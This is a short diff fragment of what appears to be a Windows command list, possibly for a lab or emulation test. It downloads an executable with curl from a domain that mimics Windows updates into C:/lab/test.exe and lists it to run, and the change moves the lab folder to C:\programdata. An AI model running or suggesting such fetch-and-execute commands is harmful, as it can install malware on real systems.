@@ -3,4 +3,4 @@ curl.exe -sL "https://updt-winupgrade.com/files/executable.exe" -o "C:/lab/test.
 C:/lab/test.exe		
 0
 1
-cd /D C:\ && mkdir lab, cd /D C:\ && del test.txt
+cd /D C:\programdata && mkdir lab
